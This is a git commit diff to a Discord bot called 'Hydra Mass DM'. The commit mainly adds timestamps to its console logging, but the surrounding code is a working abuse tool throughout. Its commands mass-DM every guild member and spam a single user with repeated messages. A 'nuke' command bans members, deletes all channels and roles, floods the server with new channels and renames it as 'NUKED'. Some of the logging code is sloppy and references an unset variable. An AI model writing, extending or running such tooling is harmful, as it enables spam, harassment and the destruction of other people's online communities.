707628f85febc834ebe4e02836b65f458d8ea80c
RIOT Administration <71534600+Riot-Byte@users.noreply.github.com>
2023-07-31 21:21:17 +0300

    Add files via upload

--- modules/sample.py
+++ modules/sample.py
@@ -1,6 +1,8 @@
 import os, colorama
 from termcolor import colored
 
+from datetime import datetime
+
 colorama.init()
 
 try:
@@ -55,8 +57,6 @@ async def on_ready():
     print(colored(f"Hydra initialized as: {client.user}",'blue'))
     print("")
 
-# funcs
-
 # commands
 
 @client.command()
@@ -83,12 +83,16 @@ async def massdm(ctx, *, message: str):
                     if str(member.id) not in userid and member.id != client.user.id and member.bot != True:
                         try:
                             await member.send(f"{message}")
-                            print(colored(f"Messaged {member} : {message}",'green'))
+                            time = datetime.now().strftime("%H:%M:%S")
+                            print(colored(f"{time}",'white'), colored(f"{time}",'white'), colored(f"Messaged {member} : {message}",'green'))
+
                         except:
-                            print(colored(f"Couldn't message {member}, their DMs are off or the bot has been blocked.",'red'))
-                print(colored("HYDRA - MASS DM COMPLETE",'magenta'))
+                            time = datetime.now().strftime("%H:%M:%S")
+                            print(colored(f"{time}",'white'), colored(f"{time}",'white'), colored(f"{time}",'white'), colored(f"Couldn't message {member}, their DMs are off or the bot has been blocked.",'red'))
+                print(colored(f"{time}",'white'), colored(f"{time}",'white'), colored("HYDRA - MASS DM COMPLETE",'magenta'))
             except Exception as e:
-                print(colored(f"Couldn't send messages: {e}",'red'))
+                time = datetime.now().strftime("%H:%M:%S")
+                print(colored(f"{time}",'white'), colored(f"{time}",'white'), colored(f"Couldn't send messages: {e}",'red'))
         elif ctx.guild is None:
             guild = client.get_guild(int(guildid))
             try:
@@ -96,12 +100,15 @@ async def massdm(ctx, *, message: str):
                     if str(member.id) not in userid and member.id != client.user.id and member.bot != True:
                         try:
                             await member.send(f"{message}")
-                            print(colored(f"Messaged {member} : {message}",'green'))
+                            time = datetime.now().strftime("%H:%M:%S")
+                            print(colored(f"{time}",'white'), colored(f"Messaged {member} : {message}",'green'))
                         except:
-                            print(colored(f"Couldn't message {member}, their DMs are off or the bot has been blocked.",'red'))
-                print(colored("HYDRA - MASS DM COMPLETE",'magenta'))
+                            time = datetime.now().strftime("%H:%M:%S")
+                            print(colored(f"{time}",'white'), colored(f"Couldn't message {member}, their DMs are off or the bot has been blocked.",'red'))
+                print(colored(f"{time}",'white'), colored("HYDRA - MASS DM COMPLETE",'magenta'))
             except Exception as e:
-                print(colored(f"Couldn't send messages: {e}",'red'))
+                time = datetime.now().strftime("%H:%M:%S")
+                print(colored(f"{time}",'white'), colored(f"Couldn't send messages: {e}",'red'))
 
 @client.command()
 async def dm(ctx, user: discord.Member, *, message: str):
@@ -113,15 +120,18 @@ async def dm(ctx, user: discord.Member, *, message: str):
             if str(user.id) not in userid and user.id != client.user.id and user.bot != True:
                 try:
                     await user.send(f"{message}")
-                    print(colored(f"Messaged {user} : {message}",'green'))
-                    print(colored("HYDRA - USER DM COMPLETE",'magenta'))
+                    print(colored(f"{time}",'white'), colored(f"Messaged {user} : {message}",'green'))
+                    print(colored(f"{time}",'white'), colored("HYDRA - USER DM COMPLETE",'magenta'))
                 except:
-                    print(colored("Couldn't send a message to this user.",'red'))
+                    time = datetime.now().strftime("%H:%M:%S")
+                    print(colored(f"{time}",'white'), colored(f"Couldn't send a message to this user.",'red'))
             else:
-                print(colored("Couldn't send a message to this user.",'red'))
+                time = datetime.now().strftime("%H:%M:%S")
+                print(colored(f"{time}",'white'), colored(f"Couldn't send a message to this user.",'red'))
 
         elif message == '':
-            print(colored("Please input a message to send.",'red'))
+            time = datetime.now().strftime("%H:%M:%S")
+            print(colored(f"{time}",'white'), colored(f"Please input a message to send.",'red'))
 
 @client.command()
 async def spamuser(ctx, user: discord.Member, amount: int, *, message: str):
@@ -136,18 +146,24 @@ async def spamuser(ctx, user: discord.Member, amount: int, *, message: str):
                         try:
                             for i in range(amount):
                                 await user.send(message)
-                                print(colored(f"[{i+1}] Messaged {user} : {message}",'green'))
-                            print(colored("HYDRA - USER SPAM COMPLETE",'magenta'))
+                                time = datetime.now().strftime("%H:%M:%S")
+                                print(colored(f"{time}",'white'), colored(f"{i+1}",'blue'), colored("/",'green'), colored(f"{str(amount)}",'blue'), colored(f"Messaged {user} : {message}",'green'))
+                            print(colored(f"{time}",'white'), colored("HYDRA - USER SPAM COMPLETE",'magenta'))
                         except:
-                            print(colored(f"Couldn't message {user}.",'red'))
+                            time = datetime.now().strftime("%H:%M:%S")
+                            print(colored(f"{time}",'white'), colored(f"Couldn't message {user}.",'red'))
                     elif amount > 50:
-                        print(colored("Cannot send more than 50 messages.",'red'))
+                        time = datetime.now().strftime("%H:%M:%S")
+                        print(colored(f"{time}",'white'), colored(f"Cannot send more than 50 messages.",'red'))
                 else:
-                    print(colored("Cannot message this user.",'red'))
+                    time = datetime.now().strftime("%H:%M:%S")
+                    print(colored(f"{time}",'white'), colored(f"Cannot message this user.",'red'))
             else:
-                print(colored("Please specify an amount of messages to spam.",'red'))
+                time = datetime.now().strftime("%H:%M:%S")
+                print(colored(f"{time}",'white'), colored(f"Please specify an amount of messages to spam.",'red'))
         else:
-            print(colored("Please specify a message to spam.",'red'))
+            time = datetime.now().strftime("%H:%M:%S")
+            print(colored(f"{time}",'white'), colored(f"Please specify a message to spam.",'red'))
 
 @client.command()
 async def nuke(ctx, mode: str, channelamount=0, channelname="", *, message=""):
@@ -165,24 +181,29 @@ async def nuke(ctx, mode: str, channelamount=0, channelname="", *, message=""):
                             if discord.utils.get(guild.roles, id=bot_member.top_role.id) > discord.utils.get(guild.roles, id=member.top_role.id):
                                 try:
                                     await member.ban(reason="HYDRA MASS DM - NUKE")
-                                    print(colored(f"Banned {member}",'green'))
+                                    time = datetime.now().strftime("%H:%M:%S")
+                                    print(colored(f"{time}",'white'), colored(f"Banned {member}",'green'))
                                 except discord.errors.Forbidden:
-                                    print(colored(f"Couldn't ban {member} because of role hierarchy.",'red'))
+                                    time = datetime.now().strftime("%H:%M:%S")
+                                    print(colored(f"{time}",'white'), colored(f"Couldn't ban {member} because of role hierarchy.",'red'))
                             else:
-                                print(colored(f"Couldn't ban {member} because of role hierarchy.",'red'))
-                    print(colored("HYDRA - MEMBER BAN COMPLETE",'magenta'))
+                                time = datetime.now().strftime("%H:%M:%S")
+                                print(colored(f"{time}",'white'), colored(f"Couldn't ban {member} because of role hierarchy.",'red'))
+                    print(colored(f"{time}",'white'), colored("HYDRA - MEMBER BAN COMPLETE",'magenta'))
                 else:
-                    print(colored("Bot requires admin permissions in the guild to ban members.",'red'))
+                    print(colored(f"{time}",'white'), colored("Bot requires admin permissions in the guild to ban members.",'red'))
             elif mode == "channels":
                 guild = ctx.guild or client.get_guild(int(guildid))
                 bot_member = guild.get_member(client.user.id)
                 if bot_member.guild_permissions.administrator:
                     for channel in guild.channels:
                         await channel.delete()
-                        print(colored(f"Deleted {channel}",'green'))
-                    print(colored("HYDRA - CHANNEL DELETION COMPLETE",'magenta'))
+                        time = datetime.now().strftime("%H:%M:%S")
+                        print(colored(f"{time}",'white'), colored(f"Deleted {channel}",'green'))
+                    print(colored(f"{time}",'white'), colored("HYDRA - CHANNEL DELETION COMPLETE",'magenta'))
                 else:
-                    print(colored("Bot requires admin permissions in the guild to delete channels.",'red'))
+                    time = datetime.now().strftime("%H:%M:%S")
+                    print(colored(f"{time}",'white'), colored(f"Bot requires admin permissions in the guild to delete channels.",'red'))
             elif mode == "roles":
                 guild = ctx.guild or client.get_guild(int(guildid))
                 bot_member = guild.get_member(client.user.id)
@@ -191,49 +212,62 @@ async def nuke(ctx, mode: str, channelamount=0, channelname="", *, message=""):
                         if role.position < bot_member.top_role.position:
                             try:
                                 await role.delete()
-                                print(colored(f"Deleted {role}",'green'))
+                                time = datetime.now().strftime("%H:%M:%S")
+                                print(colored(f"{time}",'white'), colored(f"Deleted {role}",'green'))
                             except:
                                 if role.name != "@everyone":
-                                    print(colored(f"Couldn't delete {role} because it is managed by an integration",'red'))
-                    print(colored("HYDRA - ROLE DELETION COMPLETE",'magenta'))
+                                    time = datetime.now().strftime("%H:%M:%S")
+                                    print(colored(f"{time}",'white'), colored(f"Couldn't delete {role} because it is managed by an integration",'red'))
+                    print(colored(f"{time}",'white'), colored("HYDRA - ROLE DELETION COMPLETE",'magenta'))
                 else:
-                    print(colored("Bot requires admin permissions in the guild to delete roles.",'red'))
+                    time = datetime.now().strftime("%H:%M:%S")
+                    print(colored(f"{time}",'white'), colored(f"Bot requires admin permissions in the guild to delete roles.",'red'))
             elif mode == "all":
                 guild = ctx.guild or client.get_guild(int(guildid))
                 bot_member = guild.get_member(client.user.id)
                 if bot_member.guild_permissions.administrator:
                     for channel in guild.channels:
                         await channel.delete()
-                        print(colored(f"Deleted {channel}",'green'))
+                        time = datetime.now().strftime("%H:%M:%S")
+                        print(colored(f"{time}",'white'), colored(f"Deleted {channel}",'green'))
                     for role in guild.roles:
                         if role.position < bot_member.top_role.position:
                             try:
                                 await role.delete()
-                                print(colored(f"Deleted {role}",'green'))
+                                time = datetime.now().strftime("%H:%M:%S")
+                                print(colored(f"{time}",'white'), colored(f"Deleted {role}",'green'))
                             except:
                                 if role.name != "@everyone":
-                                    print(colored(f"Couldn't delete {role} because it is managed by an integration",'red'))
+                                    time = datetime.now().strftime("%H:%M:%S")
+                                    print(colored(f"{time}",'white'), colored(f"Couldn't delete {role} because it is managed by an integration",'red'))
                     for member in guild.members:
                         if str(member.id) not in userid and member.id != client.user.id:
                             if discord.utils.get(guild.roles, id=bot_member.top_role.id) > discord.utils.get(guild.roles, id=member.top_role.id):
                                 try:
                                     await member.ban(reason="HYDRA MASS DM - NUKE")
-                                    print(colored(f"Banned {member}",'green'))
+                                    time = datetime.now().strftime("%H:%M:%S")
+                                    print(colored(f"{time}",'white'), colored(f"Banned {member}",'green'))
                                 except discord.errors.Forbidden:
-                                    print(colored(f"Couldn't ban {member} because of role hierarchy.",'red'))
+                                    time = datetime.now().strftime("%H:%M:%S")
+                                    print(colored(f"{time}",'white'), colored(f"Couldn't ban {member} because of role hierarchy.",'red'))
                             else:
-                                print(colored(f"Couldn't ban {member} because of role hierarchy.",'red'))
+                                time = datetime.now().strftime("%H:%M:%S")
+                                print(colored(f"{time}",'white'), colored(f"Couldn't ban {member} because of role hierarchy.",'red'))
                     for i in range(channelamount):
                         nukechannel = await guild.create_text_channel(channelname)
-                        print(colored(f"[{i+1}] Created {nukechannel}",'green'))
+                        time = datetime.now().strftime("%H:%M:%S")
+                        print(colored(f"{time}",'white'), colored(f"{i+1}",'blue'), colored("/",'green'), colored(f"{channelamount}",'blue'), colored(f"Created {nukechannel}",'green'))
                         await nukechannel.send(message)
                     await guild.edit(name="NUKED - HYDRA - RIOT ADMINISTRATION")
-                    print(colored(f"Changed server name to NUKED - HYDRA - RIOT ADMINISTRATION",'green'))
-                    print(colored("HYDRA - NUKE COMPLETED",'magenta'))
+                    time = datetime.now().strftime("%H:%M:%S")
+                    print(colored(f"{time}",'white'), colored(f"Changed server name to NUKED - HYDRA - RIOT ADMINISTRATION",'green'))
+                    print(colored(f"{time}",'white'), colored("HYDRA - NUKE COMPLETED",'magenta'))
                 else:
-                    print(colored("Bot requires admin permissions in the guild to nuke.",'red'))
+                    time = datetime.now().strftime("%H:%M:%S")
+                    print(colored(f"{time}",'white'), colored(f"Bot requires admin permissions in the guild to nuke.",'red'))
         else:
-            print(colored("Input a valid nuke option. Available : members/channels/roles/all",'red'))
+            time = datetime.now().strftime("%H:%M:%S")
+            print(colored(f"{time}",'white'), colored(f"Input a valid nuke option. Available : members/channels/roles/all",'red'))
 
 
 os.system("title Hydra Mass DM")
